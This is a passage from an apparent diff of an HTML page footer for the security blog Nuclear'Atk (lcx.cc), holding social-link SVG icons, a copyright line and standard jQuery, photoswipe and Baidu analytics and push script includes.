64.285714 127.142857t-7.714286 138q-5.142857 15.428571-19.428571 22.857143t-29.714286 2.285714-22.857143-19.428571-2.857143-29.714286q16-46.857143 5.714286-98.285714t-45.714286-90.285714q-35.428571-39.428571-84.571429-54.571429t-98.857143-4.857143q-16 3.428571-29.714286-5.428571t-17.142857-24.857143 5.428571-29.428571 24.857143-16.857143q70.285714-14.857143 139.428571 6.571429t118.857143 76.857143z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="zhihu"  target="_blank"
+      >
+      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M351.791182 562.469462l192.945407 0c0-45.367257-21.3871-71.939449-21.3871-71.939449L355.897709 490.530013c3.977591-82.182744 7.541767-187.659007 8.816806-226.835262l159.282726 0c0 0-0.86367-67.402109-18.578124-67.402109s-279.979646 0-279.979646 0 16.850783-88.141456 39.318494-127.053698c0 0-83.60514-4.510734-112.121614 106.962104S81.344656 355.077018 76.80834 367.390461c-4.536316 12.313443 24.62791 5.832845 36.941354 0 12.313443-5.832845 68.050885-25.924439 84.252893-103.69571l86.570681 0c1.165546 49.28652 4.596691 200.335724 3.515057 226.835262L109.86113 490.530013c-25.275663 18.147312-33.701566 71.939449-33.701566 71.939449L279.868105 562.469462c-8.497535 56.255235-23.417339 128.763642-44.275389 167.210279-33.05279 60.921511-50.55235 116.65793-169.802314 212.576513 0 0-19.442818 14.257725 40.829917 9.073656 60.273758-5.185093 117.305683-20.739347 156.840094-99.807147 20.553105-41.107233 41.805128-93.250824 58.386782-146.138358l-0.055259 0.185218 167.855986 193.263655c0 0 22.035876-51.847855 5.832845-108.880803L371.045711 650.610918l-42.1244 31.157627-0.045025 0.151449c11.69946-41.020252 20.11206-81.5749 22.726607-116.858498C351.665315 564.212152 351.72876 563.345412 351.791182 562.469462z"></path>
+  <path d="M584.918753 182.033893l0 668.840094 70.318532 0 28.807093 80.512708 121.875768-80.512708 153.600307 0L959.520453 182.033893 584.918753 182.033893zM887.150192 778.934538l-79.837326 0-99.578949 65.782216-23.537066-65.782216-24.855084 0L659.341766 256.673847l227.807403 0L887.149169 778.934538z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="douban"  target="_blank"
+      >
+      <svg class="icon" style="" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M926.917973 37.80608C959.65184 37.80608 986.19392 64.34816 986.19392 97.082027L986.19392 926.917973C986.19392 959.65184 959.65184 986.19392 926.917973 986.19392L97.082027 986.19392C64.34816 986.19392 37.80608 959.65184 37.80608 926.917973L37.80608 97.082027C37.80608 64.34816 64.34816 37.80608 97.082027 37.80608zM176.653653 176.19968 176.653653 252.678827 825.658027 252.678827 825.658027 176.19968zM217.719467 316.146347 217.719467 628.08064 273.524053 628.08064 341.292373 770.39616 157.259093 770.39616 157.259093 845.417813 842.949973 845.417813 842.949973 770.39616 654.226773 770.39616 722.899627 628.08064 783.67744 628.08064 783.67744 316.146347zM684.885333 392.891733 684.885333 553.987413 312.576 553.987413 312.576 392.891733zM570.770773 770.39616 426.653013 770.39616 359.621973 628.08064 639.443627 628.08064z"></path>
+</svg>
+
+    </a>
+
+
+<a href="https://lcx.cc/index.xml" rel="noopener alternate" type="application/rss&#43;xml"
+    class="iconfont" title="rss" target="_blank">
+    <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="30" height="30">
+  <path d="M819.157333 1024C819.157333 574.592 449.408 204.8 0 204.8V0c561.706667 0 1024 462.293333 1024 1024h-204.842667zM140.416 743.04a140.8 140.8 0 0 1 140.501333 140.586667A140.928 140.928 0 0 1 140.074667 1024C62.72 1024 0 961.109333 0 883.626667s62.933333-140.544 140.416-140.586667zM678.784 1024h-199.04c0-263.210667-216.533333-479.786667-479.744-479.786667V345.173333c372.352 0 678.784 306.517333 678.784 678.826667z"></path>
+</svg>
+
+  </a>
+   
+</div>
+
+<div class="copyright">
+
+  
+
+  <span class="copyright-year">
+    &copy;
+    
+      2010 -
+    2025
+    <span class="heart">
+      
+      <i class="iconfont">
+        <svg class="icon" viewBox="0 0 1025 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="14" height="14">
+  <path d="M1000.1 247.9c-15.5-37.3-37.6-70.6-65.7-98.9-54.4-54.8-125.8-85-201-85-85.7 0-166 39-221.4 107.4C456.6 103 376.3 64 290.6 64c-75.1 0-146.5 30.4-201.1 85.6-28.2 28.5-50.4 61.9-65.8 99.3-16 38.8-24 79.9-23.6 122.2 0.7 91.7 40.1 177.2 108.1 234.8 3.1 2.6 6 5.1 8.9 7.8 14.9 13.4 58 52.8 112.6 102.7 93.5 85.5 209.9 191.9 257.5 234.2 7 6.1 15.8 9.5 24.9 9.5 9.2 0 18.1-3.4 24.9-9.5 34.5-30.7 105.8-95.9 181.4-165 74.2-67.8 150.9-138 195.8-178.2 69.5-57.9 109.6-144.4 109.9-237.3 0.1-42.5-8-83.6-24-122.2z"
+   fill="#8a8a8a"></path>
+</svg>
+
+      </i>
+    </span><span class="author">
+        Nuclear'Atk（核攻击）网络安全实验室
+        
+      </span></span>
+
+  
+  
+
+  
+</div>
+
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont">
+        
+        <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="35" height="35">
+  <path d="M510.866688 227.694839 95.449397 629.218702l235.761562 0-2.057869 328.796468 362.40389 0L691.55698 628.188232l241.942331-3.089361L510.866688 227.694839zM63.840492 63.962777l894.052392 0 0 131.813095L63.840492 195.775872 63.840492 63.962777 63.840492 63.962777zM63.840492 63.962777"></path>
+</svg>
+
+      </i>
+    </div>
+  </div>
+  
+<script type="text/javascript" src="/lib/jquery/jquery-3.2.1.min.js"></script>
+  <script type="text/javascript" src="/lib/slideout/slideout-1.0.1.min.js"></script>
+
+
+
+
+<script type="text/javascript" src="/js/main.638251f4230630f0335d8c6748e53a96f94b72670920b60c09a56fdc8bece214.js" integrity="sha256-Y4JR9CMGMPAzXYxnSOU6lvlLcmcJILYMCaVv3Ivs4hQ=" crossorigin="anonymous"></script>
+
+
+
+
+
+
+<script id="baidu_analytics">
+  var _hmt = _hmt || [];
+  (function() {
+    if (window.location.hostname === 'localhost') return;
+    var hm = document.createElement("script"); hm.async = true;
+    hm.src = "https://hm.baidu.com/hm.js?90a2a7fb2c0fa46d3747ec9668f12a39";
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(hm, s);
+  })();
+</script>
+
+<script id="baidu_push">
+  (function(){
+    if (window.location.hostname === 'localhost') return;
+    var bp = document.createElement('script'); bp.async = true;
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+      bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+      bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+  })();
+</script>
+
+
+
+  
+    <script type="text/javascript" src="/js/load-photoswipe.js"></script>
+    <script type="text/javascript" src="/lib/photoswipe/photoswipe.min.js"></script>
+    <script type="text/javascript" src="/lib/photoswipe/photoswipe-ui-default.min.js"></script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script src="/js/my.js"></script>
+
+
+</body>
+</html>
